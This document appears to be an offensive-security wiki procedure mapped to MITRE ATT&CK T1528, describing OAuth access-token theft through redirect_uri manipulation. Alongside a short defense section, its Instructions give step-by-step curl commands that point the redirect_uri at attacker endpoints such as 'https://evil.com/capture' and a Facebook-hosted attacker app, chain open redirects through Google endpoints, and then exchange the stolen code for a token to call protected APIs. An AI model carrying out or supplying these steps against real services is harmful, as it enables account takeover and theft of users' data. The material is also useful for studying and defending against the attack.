---
type: procedure
tactics:
  - '[[tactics/Credential Access|TA0006 - Credential Access]]'
techniques:
  - >-
    [[techniques/Steal Application Access Token|T1528 - Steal Application Access
    Token]]
sub_techniques: []
tags:
  - oauth-token-theft
  - redirect-uri-manipulation
  - oauth-misconfiguration
commands:
  - '[[commands/curl-oauth-authorize-malicious-redirect]]'
  - '[[commands/curl-oauth-authorize-redirect-to-attacker-site]]'
  - '[[commands/curl-oauth-authorize-chained-redirect]]'
platforms:
  - Web
tools: []
verified: true
validated: true
---

# OAuth-Token-Theft-via-Redirect-URI

## Summary

This procedure exploits misconfigurations in OAuth 2.0 implementations by manipulating the redirect_uri parameter during the authorization flow to steal access tokens. By intercepting and modifying the authorization request to point to a attacker-controlled endpoint, the procedure captures the authorization code or token, enabling unauthorized access to protected resources.

## Description

OAuth token theft via redirect URI targets applications that fail to properly validate or whitelist the redirect_uri parameter in the authorization request. In a typical OAuth flow, a user is redirected to the authorization server, grants consent, and is sent back to the client via the specified redirect_uri with an authorization code or token. If the server does not enforce strict validation (e.g., allowing arbitrary URIs or open redirects), an attacker can alter the redirect_uri to their malicious site, which logs the sensitive token. This is common in web applications using OAuth for third-party logins (e.g., Google, Facebook). The attack requires the ability to intercept traffic, such as via a proxy, and control of a logging server. Success grants the attacker the victim's access token, potentially leading to data exfiltration or account takeover. This procedure assumes a browser-based or API-driven OAuth flow and maps to web-based environments.

## Requirements

1. Network access to the target application's OAuth authorization endpoint (e.g., via browser or proxy interception).
2. Ability to modify HTTP requests, typically using a tool like Burp Suite to intercept and alter the redirect_uri parameter.
3. Control of a malicious server or endpoint (e.g., a simple web server) to receive and log the redirected token.
4. Knowledge of the target's OAuth client_id, scope, and response_type parameters (often discoverable via reconnaissance).

## Defense

- Strictly whitelist allowed redirect_uris for each client_id, rejecting any unlisted values.
- Implement state parameters to prevent CSRF and validate redirect origins.
- Use HTTPS for all OAuth endpoints and monitor for anomalous redirect patterns or high-frequency authorization requests.
- Enable logging of authorization requests and alerts on mismatches between requested and validated redirect_uris.

## Objectives

1. Intercept and modify the OAuth authorization request to include a malicious redirect_uri.
2. Capture the authorization code or access token upon redirection to the attacker-controlled site.
3. Use the stolen token to access protected resources on behalf of the victim.

## Instructions

### Step 1: Identify and Intercept the OAuth Authorization Request

**Context**: Begin by locating the OAuth authorization endpoint through reconnaissance (e.g., via the application's login flow or API docs). Use a proxy to intercept the GET request to the /authorize endpoint, where you can modify the redirect_uri parameter to point to your malicious logging site.

**Command** ([[commands/curl-oauth-authorize-malicious-redirect]]):
```bash
curl "https://www.example.com/admin/oauth/authorize?client_id=$_CLIENT_ID&scope=$_SCOPE&redirect_uri=$_MALICIOUS_URI&response_type=code&state=$_STATE"
```

> This command sends a GET request to the authorization endpoint with a tampered redirect_uri. Replace placeholders with actual values (e.g., client_id from app registration, scope like 'openid profile', malicious_uri like 'https://evil.com/capture'). The expected output is an HTML consent page or direct redirect; monitor your malicious site for the incoming callback containing the code/token. If successful, the server responds with a 302 redirect to your URI with the code appended (e.g., ?code=abc123).

### Step 2: Chain Redirect to Attacker-Controlled Site via Legitimate Provider

**Context**: For applications integrated with providers like Facebook or Google, chain the redirect_uri to exploit open redirect vulnerabilities in those services, funneling the token to your site. This evades basic domain checks by mimicking legitimate callbacks.

**Command** ([[commands/curl-oauth-authorize-redirect-to-attacker-site]]):
```bash
curl "https://www.example.com/oauth2/authorize?client_id=$_CLIENT_ID&redirect_uri=https%3A%2F%2Fapps.facebook.com%2Fattacker%2F&scope=$_SCOPE&response_type=token"
```

> Execute this to initiate the flow with an encoded redirect_uri pointing to an attacker app on a provider (e.g., URL-encoded 'https://apps.facebook.com/attacker/'). Expected output includes a redirect chain; check your attacker endpoint for the access_token in the fragment (#access_token=xyz). This step confirms if the provider's open redirect allows token exfiltration.

### Step 3: Test Chained Redirect Through Nested Endpoints

**Context**: Test more complex chains, such as nesting redirects through legacy endpoints (e.g., OAuth 1.0-style or provider backdoors), to bypass stricter validations. Modify the redirect_uri to include a 'next' parameter pointing to your site.

**Command** ([[commands/curl-oauth-authorize-chained-redirect]]):
```bash
curl "https://www.example.com/oauth20_authorize.srf?client_id=$_CLIENT_ID&redirect_uri=https://accounts.google.com/BackToAuthSubTarget?next=$_MALICIOUS_URI&scope=$_SCOPE&response_type=code"
```

> This sends a request with a nested redirect_uri exploiting potential open redirects in Google/Facebook auth sub-targets. Expected output is a multi-hop 302 redirect; success is indicated by the final callback hitting your malicious URI with the token (e.g., ?code=def456 or #access_token=ghi789). Verify by logging the full query/fragment on your server.

### Step 4: Validate and Use the Stolen Token

**Context**: Once captured, validate the token by exchanging the code for an access token (if using authorization code flow) or directly using the implicit token. Test access to protected endpoints to confirm viability.

> No specific command here; use a tool like curl to POST to the token endpoint: `curl -X POST https://www.example.com/oauth/token -d "grant_type=authorization_code&code=$_CODE&redirect_uri=$_MALICIOUS_URI&client_id=$_CLIENT_ID"`. Expected output: JSON response with {"access_token": "valid_token"}. If valid, query API resources (e.g., /user/profile) with Authorization: Bearer $access_token to confirm access.
